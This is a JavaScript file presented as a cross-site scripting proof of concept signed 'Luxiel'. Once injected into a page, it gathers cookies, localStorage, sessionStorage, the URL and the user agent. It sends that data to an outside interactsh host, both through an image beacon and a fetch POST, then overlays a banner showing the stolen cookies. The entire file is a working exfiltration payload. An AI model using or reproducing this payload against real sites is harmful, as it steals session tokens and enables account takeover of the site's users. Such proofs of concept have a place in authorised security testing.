(function(){
  var TAG='XSS_POC_LUXIEL';
  var INTERACT='d8vmeoagp7gsf3oo2rk0qq36ygc7q4nzo.oast.me';
  function log(m){try{console.log('['+TAG+']',m);}catch(e){}}
  try{alert('XSS POC by Luxiel');}catch(e){log('alert blocked: '+e.message);}
  var exfil={
    tag:TAG,
    timestamp:new Date().toISOString(),
    domain:document.domain,
    location:window.location.href,
    referrer:document.referrer,
    userAgent:navigator.userAgent,
    title:document.title,
    cookies:document.cookie,
    localStorage:{},
    sessionStorage:{}
  };
  try{
    for(var i=0;i<localStorage.length;i++){
      var k=localStorage.key(i);
      exfil.localStorage[k]=localStorage.getItem(k);
    }
  }catch(e){exfil.localStorageError=e.message;}
  try{
    for(var i=0;i<sessionStorage.length;i++){
      var k=sessionStorage.key(i);
      exfil.sessionStorage[k]=sessionStorage.getItem(k);
    }
  }catch(e){exfil.sessionStorageError=e.message;}
  try{
    var exfilStr=JSON.stringify(exfil);
    var b64=btoa(exfilStr);
    var img=new Image();
    img.src='http://'+INTERACT+'/'+b64.substring(0,1800)+
      '?cookies='+encodeURIComponent(exfil.cookies||'').substring(0,1500)+
      '&ls='+encodeURIComponent(Object.keys(exfil.localStorage).join(',')).substring(0,1500)+
      '&v='+exfil.domain;
  }catch(e){log('img exfil err: '+e.message);}
  try{
    fetch('http://'+INTERACT+'/exfil',{
      method:'POST',mode:'no-cors',
      body:exfilStr.substring(0,8000),keepalive:true
    }).catch(function(){});
  }catch(e){}
  try{
    var el=document.createElement('div');
    el.id='luxiel-pwned';
    el.style.cssText='position:fixed;top:0;left:0;right:0;background:#cc0000;color:#fff;padding:20px;z-index:2147483647;font-family:monospace;font-size:13px;border-bottom:4px solid yellow;max-height:90vh;overflow:auto';
    var lsKeys=Object.keys(exfil.localStorage).join(', ');
    var html='';
    html+='<div style="font-size:18px;font-weight:bold">XSS POC by Luxiel &mdash; arbitrary JS in <code style="background:#000;color:#0f0;padding:2px 6px">'+document.domain+'</code></div>';
    html+='<div style="margin-top:10px"><b>Cookies:</b> <pre style="background:#000;color:#fff;padding:10px;white-space:pre-wrap;word-break:break-all;margin:5px 0">'+(exfil.cookies||'(none)')+'</pre></div>';
    html+='<div><b>localStorage ('+Object.keys(exfil.localStorage).length+' keys):</b> <pre style="background:#000;color:#fff;padding:10px;white-space:pre-wrap;word-break:break-all;margin:5px 0">'+(lsKeys||'(none)')+'</pre></div>';
    html+='<div><b>Exfil destination:</b> <code style="background:#000;color:#ff0;padding:2px 6px">'+INTERACT+'</code> (interactsh-client OOB)</div>';
    html+='<div style="margin-top:10px"><button onclick="this.parentElement.remove()" style="background:#fff;color:#000;padding:5px 10px;border:none;cursor:pointer">Dismiss</button></div>';
    el.innerHTML=html;
    (document.body||document.documentElement||document.head).appendChild(el);
  }catch(e){log('banner error: '+e.message);}
  log('PoC done. Exfil sent to interactsh: '+INTERACT);
})();